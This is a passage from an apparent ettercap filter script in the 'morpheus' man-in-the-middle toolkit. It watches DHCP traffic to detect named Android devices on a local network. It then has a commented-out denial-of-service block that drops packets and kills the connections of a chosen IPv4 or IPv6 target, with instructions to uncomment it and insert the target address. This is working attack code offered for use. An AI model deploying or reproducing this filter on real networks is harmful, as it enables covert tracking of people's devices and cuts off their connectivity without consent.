    msg("[morpheus] | status: DHCP request TO modem!");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP ✔");
    msg("[morpheus] |  info : android_pedr0 anunces is presence ✔");
    msg("[morpheus] |_ name : android-7f926b4b94fd40c17\n");
  }else{
    # DHCP: 192.168.1.97 respond to router (my is ip IS... my hostname IS...)
    if (search(DATA.data, "android-d3d4ee5705593d22")) {
      msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found...");
      msg("[morpheus] | status: DHCP request TO modem!");
      msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP ✔");
      msg("[morpheus] |  info : android carlos anunces is presence ✔");
      msg("[morpheus] |_ name : android-d3d4ee5705593d22\n");
  }else{
    # DHCP: ???.???.?? respond to router (my is ip IS... my hostname IS...)
    if (search(DATA.data, "android")) {
      msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found...");
      msg("[morpheus] | status: DHCP request TO modem!");
      msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP ✔");
      msg("[morpheus] |  info : android ??? anunces is presence ✔");
      msg("[morpheus] |_ name : android-???\n");
    }
    }
  }
}






#########################################################
##         DENIAL-OF-SERVICE ATTACK (drop,kill)        ##
#########################################################
##
# drop packet | kill connection ...
# "un-comment" this funtion to filter any tcp/udp connections
# made to OR from target ip addr (perform D0S againts ip addr)
# "remmenber to change this ip addr for your target ip addr".
#
#if (ip.src == '192.168.1.95' || ip.dst == '192.168.1.95') {
# msg("\n[morpheus] host:192.168.1.95   [ ⊶  ]  found...");
# msg("[morpheus] | status: block connection!");
# msg("[morpheus] |  info : drop target tcp/udp packet ✔");
# msg("[morpheus] |_ info : kill target tcp/udp connection ✔\n");
# drop();
# drop();
#kill();
#kill();
#}



##
# drop packet | kill IPv6 connection ...
# "un-comment" this funtion to filter any tcp/udp connections
# made to OR from target ipv6 addr (perform D0S againts ipv6 addr)
# "remmenber to change this ipv6 addr for your target ipv6 addr".
#
#if (eth.proto == IP6 && ipv6.src == 'fe80::4b15:11c8:f426:205f' || ipv6.dst == 'fe80::4b15:11c8:f426:205f') {
# msg("\n[morpheus] host:fe80::4b15..   [ ⊶  ]  found...");
# msg("[morpheus] | status: block connection!");
# msg("[morpheus] |  info : drop target IPv6 tcp/udp packet ✔");
# msg("[morpheus] |_ info : kill target IPv6 connection ✔\n");
# drop();
# drop();
#kill();
#kill();
#}

